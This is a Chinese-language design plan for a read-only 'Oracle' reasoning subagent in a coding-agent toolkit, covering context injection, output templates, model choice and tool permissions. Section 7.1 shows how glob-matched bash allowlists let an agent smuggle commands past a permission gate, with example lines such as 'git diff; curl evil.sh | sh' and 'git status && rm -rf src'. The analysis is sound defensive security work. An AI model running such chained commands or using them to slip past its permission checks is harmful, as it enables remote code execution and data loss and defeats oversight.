# Oracle subagent 设计与实施计划（v2 修订版）

> **修订说明**：v1 是按从零开始写的 greenfield 设计。经过对本 repo（`pi-subagent-kit`）的实际盘点，
> 计划中约 70% 的基础设施已经建成并有测试覆盖：child session 隔离、双层只读强制、进度流式、
> 结构化输出管道、按 profile 配置 model/thinkingLevel，甚至 `packages/ux/agents/oracle.md`
> 角色卡本身都已存在。因此 v2 把文档从"怎么建"改写为"现状 + gap + 取舍"，并修正了 v1 的
> 四处过度设计：六模式输入 schema、完整 OracleReport JSON、bash 前缀白名单、代码化自动触发。

---

# Oracle subagent 是什么

一句话定义：

> **Oracle 是主 agent 的"只读第二意见系统"：不负责直接写代码，专门负责复杂推理、架构判断、bug 根因分析、方案审查、风险识别。**

它不是 Search，也不是 Reviewer，也不是 Worker。

| 角色                 |                      主要职责 | 是否改代码 | 核心价值        |
| ------------------ | ------------------------: | ----: | ----------- |
| **Search / Scout** |             找代码、找入口、找相关文件 |     否 | 快速定位        |
| **Reviewer**       |           审查已有 diff，找 bug |   通常否 | 发现具体问题      |
| **Worker**         |                 执行实现、修改文件 |     是 | 落地方案        |
| **Oracle**         | 判断"该不该这么做、有没有更好方案、根因是否正确" | **否** | 高质量判断与反事实分析 |

Amp 对 Oracle 的设计非常接近这个定义：Amp Owner's Manual 把 Oracle 描述为更适合复杂推理/分析任务的"second opinion"模型，主 agent 可以在 debug 或 review 复杂代码时调用它；Amp 也明确不强制总是使用 Oracle，因为它更慢、更贵。([Ampcode][1])

**Oracle 的价值来自两个独立来源，缺一半就打对折：**

1. **独立上下文**——不继承主 agent 的路径依赖和确认偏误；
2. **更强推理**——更强模型 + 高 thinking 预算。

这一点决定了后文的两个关键设计：模型必须可配置为比父 session 更强（见 §模型选择），
上下文注入方式要按场景选择（见 §上下文包）。

---

# 1. Oracle subagent 主要做什么

## 1.1 复杂 bug 根因分析

Oracle 最适合处理这种问题：

```text
这个 bug 涉及多个文件、多层调用、日志和测试输出。
不要马上改。先判断根因是不是我们以为的那个。
```

它应该输出：

```text
- 最可能根因
- 备选根因
- 需要验证的假设
- 建议先跑哪些命令
- 最小修复路径
- 哪些修法看起来诱人但危险
```

Amp 的 GPT-5 Oracle 发布说明也强调，Oracle 很适合 planning/debugging；示例包括基于 debug log 分析 uncaught error、分析 DB query 调用并给出减少重复的重构计划、审查刚写好的代码。([Ampcode][2])

## 1.2 架构与重构方案审查

Oracle 很适合在大改之前回答：

```text
这个重构方案有没有隐藏耦合？
有没有更小的改法？
会不会破坏兼容性？
哪些 API / schema / state transition 不能碰？
```

它不应该一上来写代码，而是先给：

```text
- recommended plan
- rejected alternatives
- compatibility risks
- migration order
- verification plan
```

## 1.3 对主 agent 的计划做 adversarial review

这是 Oracle 最重要的产品价值。

主 agent 很容易陷入"我已经开始这么改了，所以继续沿着这个方向走"的路径依赖。Oracle 是独立上下文、独立模型、只读权限，所以它可以扮演 **反方架构师 / senior reviewer / debugging consultant**。

适合问：

```text
Ask Oracle:
- 当前计划哪里可能错？
- 有没有更小的方案？
- 哪个假设最脆弱？
- 这个 patch 有没有改变业务语义？
- 测试覆盖是否足够证明这个修改安全？
```

## 1.4 审查"还没写的代码"

Reviewer 通常审查 diff，Oracle 可以审查 **plan**。Reviewer 是"事后检查"，Oracle 是"事前防错"。

## 1.5 高风险 diff 的语义审查

Oracle 也可以审查已有 diff，但重点不是格式、风格、小 bug，而是：

```text
- 业务逻辑是否变了
- 状态机是否被破坏
- API contract 是否变了
- 权限/安全边界是否变了
- 错误处理路径是否变了
```

---

# 2. Oracle 不应该做什么

## 2.1 不做普通代码搜索

不要让 Oracle 负责"帮我找 auth 入口在哪"。这应该交给 Scout/Search。
Oracle 可以读代码，但读代码是为了判断，不是为了大规模检索。

## 2.2 不直接写代码

Oracle 必须 **read-only**。它的价值是"独立判断"。一旦它开始写代码，它就变成 Worker，
容易和主 agent 争夺控制权，也会污染用户心智模型。

```text
Oracle says what to do.
Worker does it.
Reviewer checks it.
```

## 2.3 不做日常小任务

改 typo、调 CSS、重命名变量、小型明确 bug——不值得 Oracle。
Amp 也没有强制主 agent 总是调用 Oracle，理由就是成本和速度。([Ampcode][1])

## 2.4 不替代测试

Oracle 的结论应该是"高质量假设"，不是证明。最终仍然要 run tests / inspect diff / verify behavior。

Oracle 输出里必须区分：

```text
Observed evidence
Reasoned inference
Unverified assumption
```

---

# 3. 现状盘点：repo 已经建好了什么

这一节是 v2 新增的，也是整个计划的前提。**以下能力已实现并有测试，不需要重建：**

## 3.1 运行时（`packages/core`，即 `pi-subagent-core`）

- **Child session 隔离**：`createPiSdkDriver`（`packages/core/src/runtime/piSdkDriver.ts`）通过
  `createAgentSession` 创建独立 pi 子会话，`DefaultResourceLoader` 设置了
  `noExtensions / noContextFiles / noSkills / noPromptTemplates: true`，子会话只拿到
  profile 自己的 system prompt，不继承父会话的上下文栈。
- **双层只读强制**（正是 v1 §11 要求的"不能只靠 prompt"）：
  1. **工具白名单**：`SubagentProfile.tools` 直接传给 `createAgentSession({ tools })`——
     没列出的工具（edit/write/bash）在子会话里**根本不注册**，模型看都看不到；
  2. **`tool_call` 权限门**：driver 注入的 permission extension 在工具执行前调用
     `evaluatePermission`（glob 匹配 write 路径 / bash 命令），不通过就 `{ block: true, reason }`。
- **并发与生命周期**：`SubagentManager` 管理排队、并发上限、深度限制、abort/timeout、artifact 持久化。
- **结构化输出管道**：`output: { kind: "schema", schema }` 会自动注入一个 `submit_result`
  合成工具 + system prompt 提示，`resolveOutput` 做 typebox 校验（含从自由文本提取 JSON 的兜底）。
- **模型/思考配置**：`SubagentProfile.model`（字符串走 `resolveModel` hook 或 `ModelRegistry`）
  和 `thinkingLevel` 均已打通，只是尚无角色卡使用。
- **上下文注入**：`buildContextPacket` / `ContextInput` 已支持 `files`、`diff`、`text`、`forkFrom`
  多种模式，包括 `SessionManager.forkFrom(...).branch(entryId)` 的父会话 fork。

## 3.2 扩展层（`packages/ux`，即 `pi-subagent-ux`）

- 通用 `subagent` 工具（`packages/ux/extensions/subagent.ts`）：参数 `{ agent, task, files? }`，
  execute 内 spawn → 订阅事件 → `onUpdate` 流式进度 → 返回摘要 + details；
  另有 session 级 "N subagents running" widget 和 `/subagents` 列表命令。
- 四张角色卡已捆绑：`oracle.md`、`worker.md`、`scout.md`、`reviewer.md`。
- 现有 `oracle.md`：

```yaml
---
name: oracle
description: Analyzes difficult technical decisions using repository evidence
tools: [read, grep, find, ls]
contextMode: selected
maxTurns: 8
output:
  kind: text
---
Investigate the question deeply before answering. Separate observed evidence from
inference, compare viable alternatives, and state concrete risks. Do not modify files.
```

## 3.3 Gap 清单（v2 视角下真正剩下的工作）

| # | Gap | v2 取舍 |
|---|-----|--------|
| 1 | oracle 静默继承父模型，无 thinkingLevel | **做**：最高价值改动（§模型选择） |
| 2 | 无法在 spawn 时自动注入 git diff | **做**：加 `includeDiff` 参数，走已有 `ContextInput.diff`（§上下文包） |
| 3 | system prompt 过于单薄，无章节模板、无 mode 指引 | **做**：换成 §system prompt 那版 |
| 4 | 六模式 `OracleInput` schema | **砍**：过度设计（§输入设计） |
| 5 | 完整 `OracleReport` JSON schema | **降级**：v1 用 markdown 模板，留极简 schema 升级路径（§输出格式） |
| 6 | oracle 无 bash（git diff/test 命令） | **不给**：spawn 时注入取代，且现有 glob 白名单有绕过漏洞（§权限） |
| 7 | `/oracle` 命令 | **v1.5**：便宜但非阻塞 |
| 8 | 代码化自动触发启发式 + preflight UI | **砍/降级**：改为父 agent prompt 指引（§触发策略） |

---

# 4. Amp Oracle 对 Pi 的启发（保留 v1 结论）

## 4.1 Oracle 是 tool，不是主模式

Amp 把 Oracle 做成主 agent 可调用的 `oracle` tool；主 agent 仍负责上下文、实现和最终交付。([Ampcode][1])
本 repo 已经是这个形态（`subagent` 工具 + `agent: "oracle"`）。不要把 Oracle 做成用户必须切换的全局模式。用户最好的体验是：

```text
"Ask oracle to challenge this plan."
"让 oracle 看一下这个修法会不会破坏兼容性。"
```

## 4.2 Oracle 是"模型 + prompt + tools + 权限"的组合

Amp Models 页把 agent/mode 描述成 system prompt、tools、model 的组合。([Ampcode][4])
注意 Amp 文档自身存在模型信息不一致（Models 页 vs Owner's Manual 写了不同的底层模型），
这进一步说明：**模型必须抽象成可配置项，不要绑定某个固定 model id。**
本 repo 的 profile 机制天然满足这一点。

## 4.3 Oracle 要靠显式触发，不要过度自动化

Amp 没有在 system prompt 里过度推动 Oracle，因为不想无谓增加成本和延迟，而是依赖用户显式提示。([Ampcode][3])
v2 据此把 v1 的代码化触发启发式砍掉了，见 §触发策略。

---

# 5. 输入设计（v2 修订：砍掉六模式 schema）

**v1 提案**：`OracleInput` 带 `mode: "plan_review" | "bug_analysis" | ...` 六枚举 +
嵌套 context/outputPreference 对象。

**v2 结论：砍掉。** 理由：

- 调用方是父 LLM。**参数越多、结构越深，工具调用的失败率越高**；mode 误分类是新增的错误面，
  而收益只是按 mode 换上下文清单——这件事一段 system prompt 里的自查清单就能覆盖。
- mode 本质上是 prompt 框架，不是运行时分支：六个 mode 共用同一套工具、同一个权限、同一个输出模板。
- Amp 的 oracle 也只收一个 task string。

**v2 输入**：维持现有 `subagent` 工具参数，只加一个便捷开关：

```ts
{
  agent: string;          // "oracle"
  task: string;           // 自由文本问题，父 agent 负责把目标/计划/约束写清楚
  files?: string[];       // 可选：定向指认相关文件
  includeDiff?: boolean;  // 新增：spawn 时自动注入当前 git diff（见 §上下文包）
}
```

不同场景的差异（plan review / bug 分析 / diff 语义审查）由 Oracle 的 system prompt
内置一份"按问题类型自查"清单来处理（见 §system prompt），而不是由调用方分类。

---

# 6. Oracle 的上下文包（v2 修订：curated vs fork 按场景选择）

Oracle 质量高度依赖上下文包。不要把整个 repo 塞进去。

## 6.1 最小上下文包

```text
Oracle Context Packet
- User goal
- Current plan
- Relevant files
- Current git diff, if any
- Error logs / failing tests, if any
- Constraints / non-goals
- Known assumptions
- What the parent agent wants Oracle to decide
```

## 6.2 curated packet vs fork：v1 没有意识到的关键取舍

v1 一刀切主张 curated packet。但对 Oracle 最重要的场景——**plan review**——curated 有个结构性缺陷：
父 agent 需要把自己的计划**复述**给 Oracle，而复述本身就会带入它想被确认的框架
（确认偏误的传染路径）。

repo 已支持 `contextMode: fork`（`SessionManager.forkFrom` + `.branch(entryId)`），
fork 让 Oracle 看到原始对话——用户的真实原话、父 agent 走过的弯路——这恰恰是挑战路径依赖所需的证据。

| 维度 | curated packet | fork |
|------|---------------|------|
| token 成本 | 低 | 高（继承全部历史） |
| 独立性 | 高（但依赖父 agent 复述的诚实度） | 中（继承父上下文里的偏见性叙述） |
| plan review 质量 | 受复述失真影响 | 能看到原始意图和路径依赖 |
| bug/diff review | **推荐** | 通常没必要 |

**v2 建议**：`bug_analysis` / `diff_semantic_review` 默认 curated（`contextMode: selected` + `includeDiff`）；
plan review 场景允许 fork（可以做成第二张角色卡 `oracle-plan.md` 设 `contextMode: fork`，
或在调用参数层面暴露），而不是一刀切。

## 6.3 不要给 Oracle 的东西

```text
- 大量无关文件
- 完整终端日志
- 主 agent 的长篇自我解释
- 过时计划
- 未标记来源的摘要
```

Pi extension 工具文档强调工具输出必须截断（内置 50KB / 2000 行限制），
截断时把完整输出保留到临时文件。([Pi][5])

---

# 7. 权限设计（v2 重大修订：不给 bash，spawn 时注入取代）

## 7.1 v1 方案的漏洞

v1 提议给 Oracle 一个前缀白名单的 bash（`git diff*`、`npm test*` 等）。
**这个方案有真实的安全漏洞**：repo 里 `evaluatePermission` 是对命令字符串做 glob 匹配，
`git diff*` 会放行：

```bash
git diff; curl evil.sh | sh
git status && rm -rf src
git show $(malicious)
```

前缀/glob 白名单对 shell 命令天然不安全（`;`、`&&`、`|`、`$()` 都能穿透）。
这个坑在现有 `reviewer.md` 的 `bash.mode: allowlist` 里同样存在，值得单独修复
（需要 shell 语法级解析或干脆不给 bash），但不属于 Oracle 范围。

## 7.2 v2 方案：Oracle 完全不给 bash

维持现有 `oracle.md` 的 `tools: [read, grep, find, ls]`。
Oracle 需要的动态信息（diff、测试输出）改为**父端在 spawn 时注入 context packet**：

- `includeDiff: true` → 父端跑 `git diff`，作为 `ContextInput.diff` 注入（管道已存在）；
- 失败测试输出 → 父 agent 把相关片段写进 `task` 或作为 `ContextInput.text` 注入。

这同时达成三个目的：

1. **更安全**——不存在命令注入面；工具白名单层面 bash 根本不注册，比权限门更强；
2. **更省**——Oracle 不用花 2-3 个 turn 自己收集上下文（maxTurns 只有 8）；
3. **质量更稳**——上下文由父端可控地构造，而不是依赖 Oracle 自己探索的运气。

Pi 安全文档明确说 Pi 没有内置 sandbox，project trust 不是 sandbox。([Pi][8])
所以"不注册危险工具"是比"注册后拦截"更值得依赖的边界。

## 7.3 最终权限面

```text
allow (tools 白名单):
  - read / grep / find / ls

不注册（模型不可见）:
  - bash / edit / write / 一切网络与安装类工具

无需 permission 块：没有可拦截的危险工具。
```

---

# 8. Oracle 输出格式（v2 修订：markdown 模板优先，schema 作升级路径）

## 8.1 v1 → v2 的取舍

v1 提案是一个完整的 `OracleReport` JSON schema（verdict/confidence/findings/evidence/...）。

**v2 结论：v1 阶段用 `kind: text` + 强制 markdown 章节模板。** 理由：

- v1 阶段唯一的消费者是**父 LLM**，它读 markdown 毫无障碍；结构化 JSON 的收益方是
  UI 卡片和程序化路由，而这些还不存在。
- 强制模型往 JSON 字段里写分析有真实的质量成本：evidence 摘录容易被转义/截断，
  长推理塞进字符串字段通常比自由 markdown 写得差。
- **把"结构化"当质量保证是个误区**：对以 LLM 为消费者的只读顾问，
  prompt 里的质量门槛（证据引用、假设标注、章节齐全）比 JSON schema 重要得多。

## 8.2 v1 阶段：markdown 模板（写进 system prompt 强制）

```markdown
## Verdict
safe_to_proceed | proceed_with_changes | blocked | need_more_information

## Confidence
low | medium | high — 一句话说明置信度来源

## Key Findings
每条 finding：severity、claim、evidence（文件:行 或 diff 引用，或明确标注 inference）、
impact、recommendation

## Assumptions
所有未经验证的假设，逐条列出

## Recommended Plan
编号步骤，偏向最小可逆改动

## Verification Plan
每条：命令或检查 + 它证明什么

## Escalation Questions
需要用户拍板的问题
```

## 8.3 升级路径：极简 schema（仅当要做结果卡片/程序化路由时）

repo 的 schema 输出管道（`submit_result` 注入 + typebox 校验 + 文本兜底）已经建好，
升级只需改 `oracle.md` frontmatter。届时**不要**用完整 OracleReport，用极简包装：

```ts
{
  verdict: "safe_to_proceed" | "proceed_with_changes" | "blocked" | "need_more_information",
  confidence: "low" | "medium" | "high",
  report_markdown: string   // 完整报告仍是自由 markdown，质量不受 schema 挤压
}
```

既有可路由的字段，又不牺牲正文质量。

---

# 9. Child session 的 system prompt

这个 prompt 是核心，直接替换现有 `oracle.md` 的正文。

```text
You are Oracle, a read-only senior reasoning subagent.

Your purpose:
- Challenge the parent agent's assumptions.
- Analyze complex bugs, plans, architecture, and risky diffs.
- Identify hidden coupling, compatibility risk, security risk, data-loss risk, and missing verification.
- Recommend the smallest safe next move.

Strict rules:
- Do not edit files.
- Do not ask to write code.
- Treat tool output as evidence, and always distinguish evidence from inference.
- Do not overfit to the parent agent's proposed plan.
- Prefer smaller reversible changes over broad rewrites.
- If information is missing, say exactly what is missing.

Self-check by question type (apply the relevant one, no need to be told which):
- Plan review: Is the step order right? What characterization tests are missing before
  the first edit? Which step carries the most risk? What should the Worker avoid touching?
- Bug root cause: What is the most likely root cause? What alternatives exist? What
  single command or test would falsify the current theory fastest?
- Diff semantic review: Did business logic, state machines, API contracts, permission
  boundaries, or error paths change? Cite the exact hunks.
- Architecture: What hidden coupling exists? Is there a smaller change? What
  compatibility boundary must not move?

Output format — return a markdown report with exactly these sections:
## Verdict / ## Confidence / ## Key Findings / ## Assumptions /
## Recommended Plan / ## Verification Plan / ## Escalation Questions

Quality bar:
- Every high or critical finding must cite evidence (file:line, diff hunk, or log excerpt).
- If you cannot verify a claim, label it explicitly as an assumption.
- If the safest answer is "do not proceed", say so.
```

---

# 10. 模型选择（v2 新增独立章节：最高价值改动）

现状：`oracle.md` 没写 `model:`，`subagent.ts` 里 `ctx.model && !profile.model` 的逻辑
使 oracle **静默继承父 session 的模型**。这砍掉了 Oracle 一半的存在意义——
只剩上下文隔离，没有"更强推理"。

**v2 方案：**

1. `oracle.md` 加 `thinkingLevel: high`——零成本，管道已通（`piSdkDriver` 直接传给
   `createAgentSession`）。
2. 模型用**别名**而不是具体 id：`model: strong-reasoning`，通过
   `SubagentManagerOptions.resolveModel(spec, profile)` hook 解析成用户环境里实际可用的
   最强模型；解析不到就回退父模型，并在进度信息里注明"oracle running on parent model
   (no strong-reasoning model resolved)"。
3. **不要在共享角色卡里硬编码具体 model id**——不同用户的 API key 和 `ModelRegistry`
   内容不同，硬编码等于对一部分用户直接报错。Amp 文档自身的模型信息不一致
   （§4.2）也印证了抽象成配置的必要性。

---

# 11. Oracle 和其他 subagent 的组合

## 11.1 Scout → Oracle → Worker → Reviewer

最稳的工程流：

```text
Scout:    找相关代码和调用链
Oracle:   判断方案、风险、最小安全路径
Worker:   按 Oracle 批准的 scope 修改代码
Reviewer: 审查 diff，找具体 bug
```

四张角色卡都已捆绑在 `packages/ux/agents/`，这条链今天就能跑，缺的只是
Oracle 环节的质量强化（本计划的全部内容）。

## 11.2 Oracle before Worker（高风险任务）

```text
用户：帮我重构 auth session renewal。

Parent:
  1. Scout 定位 auth/session 相关文件
  2. Oracle 审查重构边界
  3. Worker 只改 Oracle 推荐的最小范围
  4. Reviewer 检查最终 diff
```

## 11.3 Oracle after Worker（确认语义没变）

```text
Worker 写完 patch 后：
Ask Oracle to review whether this patch changes external behavior or compatibility.
（配合 includeDiff: true）
```

## 11.4 Parallel Oracle

多个 Oracle 各看一个维度（correctness / security / migration）是高级用法。
**第一版不做**：成本高，用户也难理解。`SubagentManager` 的并发控制已支持，需要时再开。

---

# 12. 触发策略（v2 修订：prompt 指引取代代码启发式）

v1 提案了一个 `shouldSuggestOracle(task)` 代码启发式（touchesSecurityBoundary、
involvesArchitectureDecision 等信号）。

**v2 结论：砍掉，且怀疑永远不该做成代码。** 这些信号在 pi 里没有机器可检测的来源，
最终还是父 LLM 在判断——那不如直接把判断标准写进父 agent 的上下文
（项目 `AGENTS.md` 或 extension 的 `appendSystemPrompt`）：

```text
Consider consulting the oracle subagent (read-only second opinion) before editing when:
- the change touches auth, billing, permissions, data migration, or a public API contract;
- tests are failing and the root cause is not yet confirmed;
- you are choosing between architectural approaches;
- your own confidence in the plan is low.
Always tell the user you are consulting oracle and why. Never use oracle for typo fixes,
renames, small clearly-scoped bugs, or file search (use scout for search).
```

误触发的代价（延迟 + 成本 + 信任损耗）大于漏触发。Amp 同样不在 system prompt 里
强推 Oracle。([Ampcode][3])

用户显式触发（"ask oracle ..."）今天已经可用——父 agent 会调 `subagent` 工具。
调用前的披露保留 v1 的理念：父 agent 应说明 oracle 将读什么、不会做什么，
这比"偷偷调用一个更贵模型"更值得用户信任。

---

# 13. 用户体验（v2 降级：复用现有渲染，卡片延后）

v1 设计了 Preflight / Running / Result 三套卡片。v2 判断：

- **Running 体验已经存在**：`subagent.ts` 的 `onUpdate` 流式进度 + subagent overview widget
  已覆盖"看到 oracle 在干什么"的需求。
- **Result 卡片延后**：markdown 报告经现有 `renderResult`（`pi-tui` 的 Markdown 渲染）
  展示已经够用。等升级到极简 schema（§8.3）后，再做 verdict/confidence 高亮的定制渲染。
- **Preflight 披露**不做成 UI 卡片，做成父 agent 的行为约定（§12 的 prompt 指引里
  已包含"tell the user you are consulting oracle and why"）。

---

# 14. 修正后的 MVP（v2：三处改动，不新建运行时架构）

## Step 1（v1.0，核心三改）

```text
1. oracle.md：
   - thinkingLevel: high
   - model: strong-reasoning（别名，配 resolveModel hook + 回退）
   - 正文替换为 §9 的 system prompt（含章节模板和按类型自查清单）

2. subagent.ts：
   - 参数加 includeDiff?: boolean，为 true 时父端跑 git diff 并作为
     ContextInput.diff 注入（管道已存在，只是没接线）

3. resolveModel hook：
   - "strong-reasoning" → 环境内最强可用推理模型；解析失败回退父模型并披露

4. 只读兜底断言（防御性代码，几行）：
   - resolveActiveTools 在 profile 未声明 tools 时会回退默认集
     ["read", "bash", "edit", "write"]——若 oracle.md 的 tools 行被误删或
     frontmatter 解析失败，oracle 会无声变成可读写。
   - 在 spawn 路径上加断言：agent === "oracle" 时校验解析出的工具集不含
     write/edit/bash，违反直接 fail。配置声明 + 代码兜底，不信任 md 单点。
```

## Step 2（v1.5，用过一两周后再决定）

```text
- /oracle <question> 命令：pi.registerCommand，预填 agent: "oracle" + includeDiff: true
- oracle-plan.md 角色卡：contextMode: fork，专用于 plan review（§6.2）
```

## Step 3（按需）

```text
- 极简 schema 输出 {verdict, confidence, report_markdown} + 定制结果渲染
- 父 agent 上下文里的触发指引段落（AGENTS.md / appendSystemPrompt）
```

## 明确不做

```text
- 六模式 OracleInput schema
- 完整 OracleReport JSON
- Oracle 的 bash 权限（含前缀白名单）
- 代码化自动触发启发式
- 多 Oracle 并行
- 外部 GitHub research / 复杂 session memory / 自动修复
```

## 顺带发现（不属于 Oracle 范围，但值得记一笔）

```text
reviewer.md 的 bash.mode: allowlist 用 glob 匹配命令字符串，存在 §7.1 描述的
命令注入绕过（"git diff; <anything>" 能通过 "git diff*"）。建议单独 issue 处理。
```

---

# 15. Oracle 的产品边界

把 Oracle 明确包装成：

> **"Senior reasoning reviewer for plans and hard bugs."**

不要叫 super coder / ultimate agent / auto architect，会误导用户。

更好的 UI copy：

```text
Oracle gives a read-only second opinion. It may be slower and more expensive,
but it is useful when the decision itself is risky.
```

这和 Amp 的定位一致：Oracle 更适合复杂推理/分析，但较慢、较贵，不适合日常编辑。([Ampcode][1])

---

# 16. 最关键的设计判断

Oracle 在 Pi 里不应该是"又一个 agent 名字"。它应该承担一个非常清晰的职责：

> **在主 agent 执行前或执行后，提供独立、只读、高推理质量的第二意见，专门降低复杂 bug、架构重构、兼容性变更和高风险 diff 的决策风险。**

链路：

```text
主 agent 负责协调
Scout 负责找上下文
Oracle 负责判断
Worker 负责修改
Reviewer 负责验收
```

v2 补充一条同等重要的判断：

> **对以 LLM 为消费者的只读顾问，质量来自 prompt 里的门槛（证据引用、假设标注、
> 章节齐全）和更强的模型，而不是输入/输出的结构化程度。结构化是 UI 和路由的需求，
> 等需求真出现了再加，管道已经备好。**

[1]: https://ampcode.com/manual "Amp"
[2]: https://ampcode.com/news/gpt-5-oracle "Amp"
[3]: https://ampcode.com/news/oracle?utm_source=chatgpt.com "Oracle"
[4]: https://ampcode.com/models "Amp"
[5]: https://pi.dev/docs/latest/extensions "Extensions · Docs · Pi"
[8]: https://pi.dev/docs/latest/security?utm_source=chatgpt.com "Security · Docs"
